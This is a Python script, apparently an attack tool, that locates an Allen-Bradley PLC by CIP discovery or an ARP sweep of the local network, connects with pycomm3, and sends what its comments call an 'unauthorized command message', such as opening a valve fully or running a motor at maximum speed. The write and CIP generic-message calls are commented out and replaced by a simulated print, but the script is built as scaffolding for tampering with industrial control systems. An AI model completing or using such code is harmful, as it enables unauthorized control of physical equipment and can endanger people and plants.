# Requires: pycomm3 (install with pip install pycomm3)
# Requires: scapy (install with pip install scapy)

import time
from pycomm3 import CIPDriver, LogixDriver
import socket
from scapy.all import ARP, Ether, srp

# Configuration - Change these if necessary
#PLC_IP = "192.168.1.10"  # Replace with the PLC's actual IP address if known, otherwise leave blank
PLC_CONTROLLER_NAME = 'MyPLC'  # Replace with the PLC's name.  Used for automatic IP discovery. If unknown, leave blank.
COMMAND_MESSAGE = 99  #Example: This could represent a command to open a valve fully, start a motor at maximum speed, etc. Consult PLC documentation for valid command codes.
DATA_TO_SEND = 12345 # Replace with data specific to the command message, if needed. This could be a setpoint value, a valve ID, etc.
TIMEOUT = 5 # timeout (in seconds) for socket operations

#--------------------- Function to discover PLC IP Address --------------------------
def discover_plc_ip(plc_name):
    """
    Discovers the PLC's IP address using CIP (Common Industrial Protocol) browsing.
    Requires the PLC's controller name.  If the controller name is not known,
    return None.
    """

    if not plc_name:
        print("PLC Name not provided; skipping IP discovery.")
        return None
    
    try:
        with CIPDriver() as driver:
            devices = driver.list_identity() # Get all devices connected to the network
            for device in devices:
                if device.get('product_name', '').strip() == plc_name:
                    ip_address = device.get('IP_address')
                    if ip_address:
                        print(f"Found PLC with name '{plc_name}' at IP address: {ip_address}")
                        return ip_address
            print(f"No PLC found with the name '{plc_name}' on the network.")
            return None
            
    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None

def discover_plc_ip_arp():
    """
    Discovers the PLC's IP address using ARP scanning of local network. This is not the most reliable
    method as it depends on ARP caching and might not work in all network setups. Use the CIP discovery
    where possible.
    """
    # Get the IP address of your network interface
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        my_ip = s.getsockname()[0]
        s.close()
    except socket.error as e:
        print(f"Error getting local IP address: {e}")
        return None

    # Determine network address range (e.g., 192.168.1.0/24)
    network_prefix = '.'.join(my_ip.split('.')[:-1]) + '.0/24'

    # Create ARP request packet
    arp_request = ARP(pdst=network_prefix)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC address
    packet = ether/arp_request

    try:
        # Send and receive ARP packets
        result = srp(packet, timeout=3, verbose=False)[0]

        # Extract IP addresses from ARP responses
        ip_addresses = []
        for sent, received in result:
            ip_addresses.append(received.psrc)

        if ip_addresses:
            print(f"Found potential PLCs at the following IP addresses: {ip_addresses}")
            # Consider adding logic to check if any of these IPs correspond to a PLC (e.g., by attempting a connection)
            return ip_addresses[0] # Return the first one found - needs better logic.
        else:
            print("No devices found on the network.")
            return None

    except Exception as e:
        print(f"Error during ARP scanning: {e}")
        return None



#--------------------- Script Execution --------------------------

def main():
    global PLC_IP
    if not PLC_IP:
        PLC_IP = discover_plc_ip(PLC_CONTROLLER_NAME) # Try CIP Discovery first
        if not PLC_IP:
            PLC_IP = discover_plc_ip_arp()  #Fall back to ARP scanning if CIP discovery fails.

        if not PLC_IP:
            print("Could not automatically determine PLC IP address. Please set PLC_IP manually and retry.")
            return


    try:
        # 1. Establish a connection to the PLC using pycomm3
        with LogixDriver(PLC_IP) as plc:  # Use LogixDriver for Allen-Bradley PLCs
            plc.timeout = TIMEOUT
            try:
                plc.open()
                print(f"Successfully connected to PLC at {PLC_IP}")
            except Exception as e:
                print(f"Failed to connect to PLC at {PLC_IP}: {e}")
                return

            # 2. Send the unauthorized command message
            try:
                # Construct a message or data structure that the PLC expects for commands.
                # This part is HIGHLY dependent on the PLC's communication protocol and how it handles commands.

                # **Important**:  The following is a placeholder. You MUST replace it with the correct
                # method for sending a command to your specific PLC model and protocol. This could involve:
                #   - Writing to a specific tag in the PLC memory
                #   - Sending a crafted CIP message
                #   - Using a specific function call in pycomm3 tailored for command execution

                #Example using write to a tag (This is likely incorrect but illustrates the idea):
                #plc.write_tag('CommandTag', COMMAND_MESSAGE)
                #plc.write_tag('CommandDataTag', DATA_TO_SEND)


                # ---  REPLACE THIS BLOCK WITH ACTUAL PLC COMMAND SENDING CODE  ---
                # The following is an example that MAY NOT WORK and requires significant adaptation
                # depending on your PLC's protocol and configuration.
                
                # Craft a CIP generic service request (this is advanced and requires PLC protocol knowledge)
                #service_code = 0x4B  # Example: Generic Service Code for Command Execution (Highly dependent on PLC)
                #path =  ['CommandModule', 1]  # Example: Path to a module in the PLC responsible for command processing.
                #request_data = b'\x01\x02\x03\x04'  # Replace with command-specific data
                #response = plc.generic_message(service=service_code, class_code=0x6B, instance=1, attribute=1, request_data=request_data, connected=False, route_path=path)

                #if response.status == 0:  # Check for successful status
                #    print("Command message sent successfully (using generic message - adapt this!)")
                #else:
                #    print(f"Error sending command message: {response.status}")

                print("Simulating sending unauthorized command message...")  #Replace this with the real command execution logic.

                # --- END OF EXAMPLE BLOCK ---


                print(f"Sent unauthorized command message: {COMMAND_MESSAGE} with data {DATA_TO_SEND}")

            except Exception as e:
                print(f"Error sending command message: {e}")
            finally:
                pass # No explicit close necessary as `with` statement handles it.


    except Exception as e:
        print(f"An unexpected error occurred: {e}")


if __name__ == "__main__":
    PLC_IP = "" #leave blank if it's supposed to find the PLC IP
    main()